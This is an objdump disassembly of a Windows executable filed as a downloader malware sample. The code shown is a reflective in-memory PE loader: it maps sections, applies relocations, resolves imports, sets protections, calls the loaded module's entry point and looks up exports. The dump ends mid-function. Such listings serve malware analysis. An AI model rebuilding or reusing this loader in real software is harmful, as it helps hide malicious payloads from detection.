
malware_samples/downloader/420c4a968b184211b9e5e2d26b5a460229249a6fbc5a3dbdba6b5096e4903b63.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	51                   	push   %ecx
  401001:	8b 44 24 08          	mov    0x8(%esp),%eax
  401005:	53                   	push   %ebx
  401006:	55                   	push   %ebp
  401007:	56                   	push   %esi
  401008:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  40100d:	57                   	push   %edi
  40100e:	74 08                	je     0x401018
  401010:	5f                   	pop    %edi
  401011:	5e                   	pop    %esi
  401012:	5d                   	pop    %ebp
  401013:	33 c0                	xor    %eax,%eax
  401015:	5b                   	pop    %ebx
  401016:	59                   	pop    %ecx
  401017:	c3                   	ret
  401018:	8b 78 3c             	mov    0x3c(%eax),%edi
  40101b:	03 f8                	add    %eax,%edi
  40101d:	89 7c 24 10          	mov    %edi,0x10(%esp)
  401021:	81 3f 50 45 00 00    	cmpl   $0x4550,(%edi)
  401027:	74 08                	je     0x401031
  401029:	5f                   	pop    %edi
  40102a:	5e                   	pop    %esi
  40102b:	5d                   	pop    %ebp
  40102c:	33 c0                	xor    %eax,%eax
  40102e:	5b                   	pop    %ebx
  40102f:	59                   	pop    %ecx
  401030:	c3                   	ret
  401031:	8b 47 50             	mov    0x50(%edi),%eax
  401034:	8b 4f 34             	mov    0x34(%edi),%ecx
  401037:	8b 35 28 30 40 00    	mov    0x403028,%esi
  40103d:	6a 04                	push   $0x4
  40103f:	68 00 20 00 00       	push   $0x2000
  401044:	50                   	push   %eax
  401045:	51                   	push   %ecx
  401046:	ff d6                	call   *%esi
  401048:	8b e8                	mov    %eax,%ebp
  40104a:	85 ed                	test   %ebp,%ebp
  40104c:	75 1a                	jne    0x401068
  40104e:	8b 57 50             	mov    0x50(%edi),%edx
  401051:	6a 04                	push   $0x4
  401053:	68 00 20 00 00       	push   $0x2000
  401058:	52                   	push   %edx
  401059:	50                   	push   %eax
  40105a:	ff d6                	call   *%esi
  40105c:	8b e8                	mov    %eax,%ebp
  40105e:	85 ed                	test   %ebp,%ebp
  401060:	75 06                	jne    0x401068
  401062:	5f                   	pop    %edi
  401063:	5e                   	pop    %esi
  401064:	5d                   	pop    %ebp
  401065:	5b                   	pop    %ebx
  401066:	59                   	pop    %ecx
  401067:	c3                   	ret
  401068:	6a 14                	push   $0x14
  40106a:	6a 00                	push   $0x0
  40106c:	ff 15 2c 30 40 00    	call   *0x40302c
  401072:	50                   	push   %eax
  401073:	ff 15 30 30 40 00    	call   *0x403030
  401079:	8b d8                	mov    %eax,%ebx
  40107b:	33 c0                	xor    %eax,%eax
  40107d:	6a 04                	push   $0x4
  40107f:	68 00 10 00 00       	push   $0x1000
  401084:	89 6b 04             	mov    %ebp,0x4(%ebx)
  401087:	89 43 0c             	mov    %eax,0xc(%ebx)
  40108a:	89 43 08             	mov    %eax,0x8(%ebx)
  40108d:	89 43 10             	mov    %eax,0x10(%ebx)
  401090:	8b 47 50             	mov    0x50(%edi),%eax
  401093:	50                   	push   %eax
  401094:	55                   	push   %ebp
  401095:	ff d6                	call   *%esi
  401097:	8b 4f 54             	mov    0x54(%edi),%ecx
  40109a:	6a 04                	push   $0x4
  40109c:	68 00 10 00 00       	push   $0x1000
  4010a1:	51                   	push   %ecx
  4010a2:	55                   	push   %ebp
  4010a3:	ff d6                	call   *%esi
  4010a5:	8b 74 24 18          	mov    0x18(%esp),%esi
  4010a9:	8b 57 54             	mov    0x54(%edi),%edx
  4010ac:	8b f8                	mov    %eax,%edi
  4010ae:	53                   	push   %ebx
  4010af:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  4010b2:	03 ca                	add    %edx,%ecx
  4010b4:	8b d1                	mov    %ecx,%edx
  4010b6:	c1 e9 02             	shr    $0x2,%ecx
  4010b9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4010bb:	8b ca                	mov    %edx,%ecx
  4010bd:	83 e1 03             	and    $0x3,%ecx
  4010c0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4010c2:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4010c6:	8b 74 24 14          	mov    0x14(%esp),%esi
  4010ca:	56                   	push   %esi
  4010cb:	51                   	push   %ecx
  4010cc:	8b 51 3c             	mov    0x3c(%ecx),%edx
  4010cf:	03 c2                	add    %edx,%eax
  4010d1:	89 03                	mov    %eax,(%ebx)
  4010d3:	89 68 34             	mov    %ebp,0x34(%eax)
  4010d6:	e8 75 00 00 00       	call   0x401150
  4010db:	8b 4e 34             	mov    0x34(%esi),%ecx
  4010de:	8b c5                	mov    %ebp,%eax
  4010e0:	83 c4 0c             	add    $0xc,%esp
  4010e3:	2b c1                	sub    %ecx,%eax
  4010e5:	74 0a                	je     0x4010f1
  4010e7:	50                   	push   %eax
  4010e8:	53                   	push   %ebx
  4010e9:	e8 f2 01 00 00       	call   0x4012e0
  4010ee:	83 c4 08             	add    $0x8,%esp
  4010f1:	53                   	push   %ebx
  4010f2:	e8 69 02 00 00       	call   0x401360
  4010f7:	83 c4 04             	add    $0x4,%esp
  4010fa:	85 c0                	test   %eax,%eax
  4010fc:	74 23                	je     0x401121
  4010fe:	53                   	push   %ebx
  4010ff:	e8 1c 01 00 00       	call   0x401220
  401104:	8b 03                	mov    (%ebx),%eax
  401106:	83 c4 04             	add    $0x4,%esp
  401109:	8b 40 28             	mov    0x28(%eax),%eax
  40110c:	85 c0                	test   %eax,%eax
  40110e:	74 29                	je     0x401139
  401110:	03 c5                	add    %ebp,%eax
  401112:	85 c0                	test   %eax,%eax
  401114:	74 0b                	je     0x401121
  401116:	6a 00                	push   $0x0
  401118:	6a 01                	push   $0x1
  40111a:	55                   	push   %ebp
  40111b:	ff d0                	call   *%eax
  40111d:	85 c0                	test   %eax,%eax
  40111f:	75 11                	jne    0x401132
  401121:	53                   	push   %ebx
  401122:	e8 09 04 00 00       	call   0x401530
  401127:	83 c4 04             	add    $0x4,%esp
  40112a:	33 c0                	xor    %eax,%eax
  40112c:	5f                   	pop    %edi
  40112d:	5e                   	pop    %esi
  40112e:	5d                   	pop    %ebp
  40112f:	5b                   	pop    %ebx
  401130:	59                   	pop    %ecx
  401131:	c3                   	ret
  401132:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%ebx)
  401139:	5f                   	pop    %edi
  40113a:	5e                   	pop    %esi
  40113b:	8b c3                	mov    %ebx,%eax
  40113d:	5d                   	pop    %ebp
  40113e:	5b                   	pop    %ebx
  40113f:	59                   	pop    %ecx
  401140:	c3                   	ret
  401141:	90                   	nop
  401142:	90                   	nop
  401143:	90                   	nop
  401144:	90                   	nop
  401145:	90                   	nop
  401146:	90                   	nop
  401147:	90                   	nop
  401148:	90                   	nop
  401149:	90                   	nop
  40114a:	90                   	nop
  40114b:	90                   	nop
  40114c:	90                   	nop
  40114d:	90                   	nop
  40114e:	90                   	nop
  40114f:	90                   	nop
  401150:	51                   	push   %ecx
  401151:	8b 44 24 10          	mov    0x10(%esp),%eax
  401155:	53                   	push   %ebx
  401156:	55                   	push   %ebp
  401157:	33 c9                	xor    %ecx,%ecx
  401159:	8b 68 04             	mov    0x4(%eax),%ebp
  40115c:	8b 00                	mov    (%eax),%eax
  40115e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401165:	00 
  401166:	66 8b 48 14          	mov    0x14(%eax),%cx
  40116a:	66 83 78 06 00       	cmpw   $0x0,0x6(%eax)
  40116f:	8d 5c 01 18          	lea    0x18(%ecx,%eax,1),%ebx
  401173:	0f 86 98 00 00 00    	jbe    0x401211
  401179:	56                   	push   %esi
  40117a:	57                   	push   %edi
  40117b:	83 c3 10             	add    $0x10,%ebx
  40117e:	83 3b 00             	cmpl   $0x0,(%ebx)
  401181:	75 38                	jne    0x4011bb
  401183:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401187:	8b 72 38             	mov    0x38(%edx),%esi
  40118a:	85 f6                	test   %esi,%esi
  40118c:	7e 61                	jle    0x4011ef
  40118e:	8b 43 fc             	mov    -0x4(%ebx),%eax
  401191:	6a 04                	push   $0x4
  401193:	68 00 10 00 00       	push   $0x1000
  401198:	03 c5                	add    %ebp,%eax
  40119a:	56                   	push   %esi
  40119b:	50                   	push   %eax
  40119c:	ff 15 28 30 40 00    	call   *0x403028
  4011a2:	8b ce                	mov    %esi,%ecx
  4011a4:	8b f8                	mov    %eax,%edi
  4011a6:	8b d1                	mov    %ecx,%edx
  4011a8:	33 c0                	xor    %eax,%eax
  4011aa:	c1 e9 02             	shr    $0x2,%ecx
  4011ad:	89 7b f8             	mov    %edi,-0x8(%ebx)
  4011b0:	f3 ab                	rep stos %eax,%es:(%edi)
  4011b2:	8b ca                	mov    %edx,%ecx
  4011b4:	83 e1 03             	and    $0x3,%ecx
  4011b7:	f3 aa                	rep stos %al,%es:(%edi)
  4011b9:	eb 34                	jmp    0x4011ef
  4011bb:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  4011be:	8b 03                	mov    (%ebx),%eax
  4011c0:	6a 04                	push   $0x4
  4011c2:	68 00 10 00 00       	push   $0x1000
  4011c7:	03 cd                	add    %ebp,%ecx
  4011c9:	50                   	push   %eax
  4011ca:	51                   	push   %ecx
  4011cb:	ff 15 28 30 40 00    	call   *0x403028
  4011d1:	8b 0b                	mov    (%ebx),%ecx
  4011d3:	8b 73 04             	mov    0x4(%ebx),%esi
  4011d6:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4011da:	8b d1                	mov    %ecx,%edx
  4011dc:	03 f7                	add    %edi,%esi
  4011de:	8b f8                	mov    %eax,%edi
  4011e0:	c1 e9 02             	shr    $0x2,%ecx
  4011e3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4011e5:	8b ca                	mov    %edx,%ecx
  4011e7:	83 e1 03             	and    $0x3,%ecx
  4011ea:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4011ec:	89 43 f8             	mov    %eax,-0x8(%ebx)
  4011ef:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4011f3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4011f7:	40                   	inc    %eax
  4011f8:	83 c3 28             	add    $0x28,%ebx
  4011fb:	8b 11                	mov    (%ecx),%edx
  4011fd:	33 c9                	xor    %ecx,%ecx
  4011ff:	89 44 24 10          	mov    %eax,0x10(%esp)
  401203:	66 8b 4a 06          	mov    0x6(%edx),%cx
  401207:	3b c1                	cmp    %ecx,%eax
  401209:	0f 8c 6f ff ff ff    	jl     0x40117e
  40120f:	5f                   	pop    %edi
  401210:	5e                   	pop    %esi
  401211:	5d                   	pop    %ebp
  401212:	5b                   	pop    %ebx
  401213:	59                   	pop    %ecx
  401214:	c3                   	ret
  401215:	90                   	nop
  401216:	90                   	nop
  401217:	90                   	nop
  401218:	90                   	nop
  401219:	90                   	nop
  40121a:	90                   	nop
  40121b:	90                   	nop
  40121c:	90                   	nop
  40121d:	90                   	nop
  40121e:	90                   	nop
  40121f:	90                   	nop
  401220:	51                   	push   %ecx
  401221:	8b 44 24 08          	mov    0x8(%esp),%eax
  401225:	53                   	push   %ebx
  401226:	33 c9                	xor    %ecx,%ecx
  401228:	55                   	push   %ebp
  401229:	8b 18                	mov    (%eax),%ebx
  40122b:	33 ed                	xor    %ebp,%ebp
  40122d:	66 8b 4b 14          	mov    0x14(%ebx),%cx
  401231:	66 39 6b 06          	cmp    %bp,0x6(%ebx)
  401235:	8d 44 19 18          	lea    0x18(%ecx,%ebx,1),%eax
  401239:	0f 86 95 00 00 00    	jbe    0x4012d4
  40123f:	56                   	push   %esi
  401240:	57                   	push   %edi
  401241:	8d 78 24             	lea    0x24(%eax),%edi
  401244:	8b 07                	mov    (%edi),%eax
  401246:	8b c8                	mov    %eax,%ecx
  401248:	8b d0                	mov    %eax,%edx
  40124a:	c1 e9 1d             	shr    $0x1d,%ecx
  40124d:	c1 ea 1e             	shr    $0x1e,%edx
  401250:	8b f0                	mov    %eax,%esi
  401252:	83 e1 01             	and    $0x1,%ecx
  401255:	83 e2 01             	and    $0x1,%edx
  401258:	c1 ee 1f             	shr    $0x1f,%esi
  40125b:	a9 00 00 00 02       	test   $0x2000000,%eax
  401260:	74 15                	je     0x401277
  401262:	8b 57 ec             	mov    -0x14(%edi),%edx
  401265:	8b 47 e4             	mov    -0x1c(%edi),%eax
  401268:	68 00 40 00 00       	push   $0x4000
  40126d:	52                   	push   %edx
  40126e:	50                   	push   %eax
  40126f:	ff 15 20 30 40 00    	call   *0x403020
  401275:	eb 43                	jmp    0x4012ba
  401277:	8d 0c 4a             	lea    (%edx,%ecx,2),%ecx
  40127a:	a9 00 00 00 04       	test   $0x4000000,%eax
  40127f:	8d 14 4e             	lea    (%esi,%ecx,2),%edx
  401282:	8b 14 95 10 40 40 00 	mov    0x404010(,%edx,4),%edx
  401289:	74 03                	je     0x40128e
  40128b:	80 ce 02             	or     $0x2,%dh
  40128e:	8b 4f ec             	mov    -0x14(%edi),%ecx
  401291:	85 c9                	test   %ecx,%ecx
  401293:	75 12                	jne    0x4012a7
  401295:	a8 40                	test   $0x40,%al
  401297:	74 05                	je     0x40129e
  401299:	8b 4b 20             	mov    0x20(%ebx),%ecx
  40129c:	eb 07                	jmp    0x4012a5
  40129e:	a8 80                	test   $0x80,%al
  4012a0:	74 18                	je     0x4012ba
  4012a2:	8b 4b 24             	mov    0x24(%ebx),%ecx
  4012a5:	85 c9                	test   %ecx,%ecx
  4012a7:	76 11                	jbe    0x4012ba
  4012a9:	8d 44 24 10          	lea    0x10(%esp),%eax
  4012ad:	50                   	push   %eax
  4012ae:	52                   	push   %edx
  4012af:	51                   	push   %ecx
  4012b0:	8b 4f e4             	mov    -0x1c(%edi),%ecx
  4012b3:	51                   	push   %ecx
  4012b4:	ff 15 24 30 40 00    	call   *0x403024
  4012ba:	8b 54 24 18          	mov    0x18(%esp),%edx
  4012be:	33 c0                	xor    %eax,%eax
  4012c0:	45                   	inc    %ebp
  4012c1:	83 c7 28             	add    $0x28,%edi
  4012c4:	8b 1a                	mov    (%edx),%ebx
  4012c6:	66 8b 43 06          	mov    0x6(%ebx),%ax
  4012ca:	3b e8                	cmp    %eax,%ebp
  4012cc:	0f 8c 72 ff ff ff    	jl     0x401244
  4012d2:	5f                   	pop    %edi
  4012d3:	5e                   	pop    %esi
  4012d4:	5d                   	pop    %ebp
  4012d5:	5b                   	pop    %ebx
  4012d6:	59                   	pop    %ecx
  4012d7:	c3                   	ret
  4012d8:	90                   	nop
  4012d9:	90                   	nop
  4012da:	90                   	nop
  4012db:	90                   	nop
  4012dc:	90                   	nop
  4012dd:	90                   	nop
  4012de:	90                   	nop
  4012df:	90                   	nop
  4012e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4012e4:	53                   	push   %ebx
  4012e5:	8b 58 04             	mov    0x4(%eax),%ebx
  4012e8:	8b 00                	mov    (%eax),%eax
  4012ea:	05 a0 00 00 00       	add    $0xa0,%eax
  4012ef:	8b 48 04             	mov    0x4(%eax),%ecx
  4012f2:	85 c9                	test   %ecx,%ecx
  4012f4:	76 61                	jbe    0x401357
  4012f6:	8b 08                	mov    (%eax),%ecx
  4012f8:	8b 04 19             	mov    (%ecx,%ebx,1),%eax
  4012fb:	03 cb                	add    %ebx,%ecx
  4012fd:	85 c0                	test   %eax,%eax
  4012ff:	76 56                	jbe    0x401357
  401301:	55                   	push   %ebp
  401302:	56                   	push   %esi
  401303:	57                   	push   %edi
  401304:	8d 3c 18             	lea    (%eax,%ebx,1),%edi
  401307:	8b 41 04             	mov    0x4(%ecx),%eax
  40130a:	83 e8 08             	sub    $0x8,%eax
  40130d:	33 f6                	xor    %esi,%esi
  40130f:	a9 fe ff ff ff       	test   $0xfffffffe,%eax
  401314:	8d 51 08             	lea    0x8(%ecx),%edx
  401317:	76 32                	jbe    0x40134b
  401319:	33 c0                	xor    %eax,%eax
  40131b:	66 8b 02             	mov    (%edx),%ax
  40131e:	8b e8                	mov    %eax,%ebp
  401320:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  401326:	81 fd 00 30 00 00    	cmp    $0x3000,%ebp
  40132c:	75 0d                	jne    0x40133b
  40132e:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401332:	25 ff 0f 00 00       	and    $0xfff,%eax
  401337:	03 c7                	add    %edi,%eax
  401339:	01 28                	add    %ebp,(%eax)
  40133b:	8b 41 04             	mov    0x4(%ecx),%eax
  40133e:	46                   	inc    %esi
  40133f:	83 e8 08             	sub    $0x8,%eax
  401342:	83 c2 02             	add    $0x2,%edx
  401345:	d1 e8                	shr    $1,%eax
  401347:	3b f0                	cmp    %eax,%esi
  401349:	72 ce                	jb     0x401319
  40134b:	03 49 04             	add    0x4(%ecx),%ecx
  40134e:	8b 01                	mov    (%ecx),%eax
  401350:	85 c0                	test   %eax,%eax
  401352:	77 b0                	ja     0x401304
  401354:	5f                   	pop    %edi
  401355:	5e                   	pop    %esi
  401356:	5d                   	pop    %ebp
  401357:	5b                   	pop    %ebx
  401358:	c3                   	ret
  401359:	90                   	nop
  40135a:	90                   	nop
  40135b:	90                   	nop
  40135c:	90                   	nop
  40135d:	90                   	nop
  40135e:	90                   	nop
  40135f:	90                   	nop
  401360:	51                   	push   %ecx
  401361:	53                   	push   %ebx
  401362:	55                   	push   %ebp
  401363:	56                   	push   %esi
  401364:	57                   	push   %edi
  401365:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401369:	bb 01 00 00 00       	mov    $0x1,%ebx
  40136e:	8b 07                	mov    (%edi),%eax
  401370:	8b 6f 04             	mov    0x4(%edi),%ebp
  401373:	05 80 00 00 00       	add    $0x80,%eax
  401378:	8b 48 04             	mov    0x4(%eax),%ecx
  40137b:	85 c9                	test   %ecx,%ecx
  40137d:	0f 86 da 00 00 00    	jbe    0x40145d
  401383:	8b 30                	mov    (%eax),%esi
  401385:	6a 14                	push   $0x14
  401387:	03 f5                	add    %ebp,%esi
  401389:	56                   	push   %esi
  40138a:	89 74 24 18          	mov    %esi,0x18(%esp)
  40138e:	ff 15 14 30 40 00    	call   *0x403014
  401394:	85 c0                	test   %eax,%eax
  401396:	0f 85 c1 00 00 00    	jne    0x40145d
  40139c:	8b 46 0c             	mov    0xc(%esi),%eax
  40139f:	85 c0                	test   %eax,%eax
  4013a1:	0f 84 be 00 00 00    	je     0x401465
  4013a7:	03 c5                	add    %ebp,%eax
  4013a9:	50                   	push   %eax
  4013aa:	ff 15 18 30 40 00    	call   *0x403018
  4013b0:	8b d8                	mov    %eax,%ebx
  4013b2:	85 db                	test   %ebx,%ebx
  4013b4:	0f 84 9b 00 00 00    	je     0x401455
  4013ba:	8b 47 0c             	mov    0xc(%edi),%eax
  4013bd:	8b 57 08             	mov    0x8(%edi),%edx
  4013c0:	8d 0c 85 04 00 00 00 	lea    0x4(,%eax,4),%ecx
  4013c7:	51                   	push   %ecx
  4013c8:	52                   	push   %edx
  4013c9:	e8 62 0e 00 00       	call   0x402230
  4013ce:	83 c4 08             	add    $0x8,%esp
  4013d1:	89 47 08             	mov    %eax,0x8(%edi)
  4013d4:	85 c0                	test   %eax,%eax
  4013d6:	74 7d                	je     0x401455
  4013d8:	8b 4f 0c             	mov    0xc(%edi),%ecx
  4013db:	89 1c 88             	mov    %ebx,(%eax,%ecx,4)
  4013de:	8b 57 0c             	mov    0xc(%edi),%edx
  4013e1:	42                   	inc    %edx
  4013e2:	89 57 0c             	mov    %edx,0xc(%edi)
  4013e5:	8b 06                	mov    (%esi),%eax
  4013e7:	85 c0                	test   %eax,%eax
  4013e9:	74 0a                	je     0x4013f5
  4013eb:	8b 76 10             	mov    0x10(%esi),%esi
  4013ee:	8d 3c 28             	lea    (%eax,%ebp,1),%edi
  4013f1:	03 f5                	add    %ebp,%esi
  4013f3:	eb 08                	jmp    0x4013fd
  4013f5:	8b 56 10             	mov    0x10(%esi),%edx
  4013f8:	8d 3c 2a             	lea    (%edx,%ebp,1),%edi
  4013fb:	8b f7                	mov    %edi,%esi
  4013fd:	8b 07                	mov    (%edi),%eax
  4013ff:	85 c0                	test   %eax,%eax
  401401:	74 2d                	je     0x401430
  401403:	a9 00 00 00 80       	test   $0x80000000,%eax
  401408:	74 07                	je     0x401411
  40140a:	25 ff ff 00 00       	and    $0xffff,%eax
  40140f:	eb 04                	jmp    0x401415
  401411:	8d 44 28 02          	lea    0x2(%eax,%ebp,1),%eax
  401415:	50                   	push   %eax
  401416:	53                   	push   %ebx
  401417:	ff 15 1c 30 40 00    	call   *0x40301c
  40141d:	85 c0                	test   %eax,%eax
  40141f:	89 06                	mov    %eax,(%esi)
  401421:	74 32                	je     0x401455
  401423:	8b 47 04             	mov    0x4(%edi),%eax
  401426:	83 c7 04             	add    $0x4,%edi
  401429:	83 c6 04             	add    $0x4,%esi
  40142c:	85 c0                	test   %eax,%eax
  40142e:	75 d3                	jne    0x401403
  401430:	8b 44 24 10          	mov    0x10(%esp),%eax
  401434:	6a 14                	push   $0x14
  401436:	83 c0 14             	add    $0x14,%eax
  401439:	50                   	push   %eax
  40143a:	89 44 24 18          	mov    %eax,0x18(%esp)
  40143e:	ff 15 14 30 40 00    	call   *0x403014
  401444:	85 c0                	test   %eax,%eax
  401446:	75 1d                	jne    0x401465
  401448:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40144c:	8b 74 24 10          	mov    0x10(%esp),%esi
  401450:	e9 47 ff ff ff       	jmp    0x40139c
  401455:	5f                   	pop    %edi
  401456:	5e                   	pop    %esi
  401457:	5d                   	pop    %ebp
  401458:	33 c0                	xor    %eax,%eax
  40145a:	5b                   	pop    %ebx
  40145b:	59                   	pop    %ecx
  40145c:	c3                   	ret
  40145d:	5f                   	pop    %edi
  40145e:	5e                   	pop    %esi
  40145f:	8b c3                	mov    %ebx,%eax
  401461:	5d                   	pop    %ebp
  401462:	5b                   	pop    %ebx
  401463:	59                   	pop    %ecx
  401464:	c3                   	ret
  401465:	5f                   	pop    %edi
  401466:	5e                   	pop    %esi
  401467:	5d                   	pop    %ebp
  401468:	b8 01 00 00 00       	mov    $0x1,%eax
  40146d:	5b                   	pop    %ebx
  40146e:	59                   	pop    %ecx
  40146f:	c3                   	ret
  401470:	51                   	push   %ecx
  401471:	8b 44 24 08          	mov    0x8(%esp),%eax
  401475:	55                   	push   %ebp
  401476:	56                   	push   %esi
  401477:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  40147e:	ff 
  40147f:	8b 68 04             	mov    0x4(%eax),%ebp
  401482:	8b 00                	mov    (%eax),%eax
  401484:	83 c0 78             	add    $0x78,%eax
  401487:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  40148b:	8b 48 04             	mov    0x4(%eax),%ecx
  40148e:	85 c9                	test   %ecx,%ecx
  401490:	0f 84 8a 00 00 00    	je     0x401520
  401496:	8b 30                	mov    (%eax),%esi
  401498:	8b 44 2e 18          	mov    0x18(%esi,%ebp,1),%eax
  40149c:	03 f5                	add    %ebp,%esi
  40149e:	85 c0                	test   %eax,%eax
  4014a0:	74 7e                	je     0x401520
  4014a2:	8b 46 14             	mov    0x14(%esi),%eax
  4014a5:	85 c0                	test   %eax,%eax
  4014a7:	74 77                	je     0x401520
  4014a9:	53                   	push   %ebx
  4014aa:	57                   	push   %edi
  4014ab:	e8 70 0d 00 00       	call   0x402220
  4014b0:	8b 7e 20             	mov    0x20(%esi),%edi
  4014b3:	8b 5e 24             	mov    0x24(%esi),%ebx
  4014b6:	8b 46 18             	mov    0x18(%esi),%eax
  4014b9:	03 fd                	add    %ebp,%edi
  4014bb:	03 dd                	add    %ebp,%ebx
  4014bd:	33 ed                	xor    %ebp,%ebp
  4014bf:	85 c0                	test   %eax,%eax
  4014c1:	76 28                	jbe    0x4014eb
  4014c3:	8b 07                	mov    (%edi),%eax
  4014c5:	8b 54 24 10          	mov    0x10(%esp),%edx
  4014c9:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4014cd:	03 c2                	add    %edx,%eax
  4014cf:	50                   	push   %eax
  4014d0:	51                   	push   %ecx
  4014d1:	e8 0a 0f 00 00       	call   0x4023e0
  4014d6:	83 c4 08             	add    $0x8,%esp
  4014d9:	85 c0                	test   %eax,%eax
  4014db:	74 3c                	je     0x401519
  4014dd:	8b 46 18             	mov    0x18(%esi),%eax
  4014e0:	45                   	inc    %ebp
  4014e1:	83 c7 04             	add    $0x4,%edi
  4014e4:	83 c3 02             	add    $0x2,%ebx
  4014e7:	3b e8                	cmp    %eax,%ebp
  4014e9:	72 d8                	jb     0x4014c3
  4014eb:	8b 44 24 18          	mov    0x18(%esp),%eax
  4014ef:	8b 4e 14             	mov    0x14(%esi),%ecx
  4014f2:	5f                   	pop    %edi
  4014f3:	3b c8                	cmp    %eax,%ecx
  4014f5:	5b                   	pop    %ebx
  4014f6:	1b d2                	sbb    %edx,%edx
  4014f8:	33 c9                	xor    %ecx,%ecx
  4014fa:	f7 da                	neg    %edx
  4014fc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4014ff:	0f 94 c1             	sete   %cl
  401502:	0b d1                	or     %ecx,%edx
  401504:	75 1a                	jne    0x401520
  401506:	8b 56 1c             	mov    0x1c(%esi),%edx
  401509:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40150d:	5e                   	pop    %esi
  40150e:	5d                   	pop    %ebp
  40150f:	8d 04 82             	lea    (%edx,%eax,4),%eax
  401512:	8b 04 08             	mov    (%eax,%ecx,1),%eax
  401515:	03 c1                	add    %ecx,%eax
  401517:	59                   	pop    %ecx
  401518:	c3                   	ret
  401519:	33 c0                	xor    %eax,%eax
  40151b:	66 8b 03             	mov    (%ebx),%ax
  40151e:	eb cf                	jmp    0x4014ef
  401520:	5e                   	pop    %esi
  401521:	33 c0                	xor    %eax,%eax
  401523:	5d                   	pop    %ebp
  401524:	59                   	pop    %ecx
  401525:	c3                   	ret
  401526:	90                   	nop
  401527:	90                   	nop
  401528:	90                   	nop
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop
  401530:	56                   	push   %esi
  401531:	8b 74 24 08          	mov    0x8(%esp),%esi
  401535:	85 f6                	test   %esi,%esi
  401537:	0f 84 80 00 00 00    	je     0x4015bd
  40153d:	8b 46 10             	mov    0x10(%esi),%eax
  401540:	85 c0                	test   %eax,%eax
  401542:	74 18                	je     0x40155c
  401544:	8b 0e                	mov    (%esi),%ecx
  401546:	8b 46 04             	mov    0x4(%esi),%eax
  401549:	6a 00                	push   $0x0
  40154b:	6a 00                	push   $0x0
  40154d:	8b 51 28             	mov    0x28(%ecx),%edx
  401550:	50                   	push   %eax
  401551:	03 d0                	add    %eax,%edx
  401553:	ff d2                	call   *%edx
  401555:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40155c:	8b 46 08             	mov    0x8(%esi),%eax
  40155f:	85 c0                	test   %eax,%eax
  401561:	74 35                	je     0x401598
  401563:	8b 46 0c             	mov    0xc(%esi),%eax
  401566:	57                   	push   %edi
  401567:	33 ff                	xor    %edi,%edi
  401569:	85 c0                	test   %eax,%eax
  40156b:	7e 1e                	jle    0x40158b
  40156d:	53                   	push   %ebx
  40156e:	8b 1d 0c 30 40 00    	mov    0x40300c,%ebx
  401574:	8b 46 08             	mov    0x8(%esi),%eax
  401577:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  40157a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40157d:	74 03                	je     0x401582
  40157f:	50                   	push   %eax
  401580:	ff d3                	call   *%ebx
  401582:	8b 46 0c             	mov    0xc(%esi),%eax
  401585:	47                   	inc    %edi
  401586:	3b f8                	cmp    %eax,%edi
  401588:	7c ea                	jl     0x401574
  40158a:	5b                   	pop    %ebx
  40158b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40158e:	51                   	push   %ecx
  40158f:	e8 a2 0c 00 00       	call   0x402236
  401594:	83 c4 04             	add    $0x4,%esp
  401597:	5f                   	pop    %edi
  401598:	8b 46 04             	mov    0x4(%esi),%eax
  40159b:	85 c0                	test   %eax,%eax
  40159d:	74 0e                	je     0x4015ad
  40159f:	68 00 80 00 00       	push   $0x8000
  4015a4:	6a 00                	push   $0x0
  4015a6:	50                   	push   %eax
  4015a7:	ff 15 20 30 40 00    	call   *0x403020
  4015ad:	56                   	push   %esi
  4015ae:	6a 00                	push   $0x0
  4015b0:	ff 15 2c 30 40 00    	call   *0x40302c
  4015b6:	50                   	push   %eax
  4015b7:	ff 15 10 30 40 00    	call   *0x403010
  4015bd:	5e                   	pop    %esi
  4015be:	c3                   	ret
  4015bf:	90                   	nop
  4015c0:	51                   	push   %ecx
  4015c1:	53                   	push   %ebx
  4015c2:	55                   	push   %ebp
  4015c3:	56                   	push   %esi
  4015c4:	57                   	push   %edi
  4015c5:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4015c9:	33 ed                	xor    %ebp,%ebp
  4015cb:	57                   	push   %edi
  4015cc:	e8 2f 0c 00 00       	call   0x402200
  4015d1:	40                   	inc    %eax
  4015d2:	50                   	push   %eax
  4015d3:	e8 64 0c 00 00       	call   0x40223c
  4015d8:	89 44 24 18          	mov    %eax,0x18(%esp)
  4015dc:	89 44 24 20          	mov    %eax,0x20(%esp)
  4015e0:	8a 07                	mov    (%edi),%al
  4015e2:	83 c4 08             	add    $0x8,%esp
  4015e5:	84 c0                	test   %al,%al
  4015e7:	0f 84 d5 00 00 00    	je     0x4016c2
  4015ed:	83 c7 02             	add    $0x2,%edi
  4015f0:	85 ed                	test   %ebp,%ebp
  4015f2:	0f 85 ca 00 00 00    	jne    0x4016c2
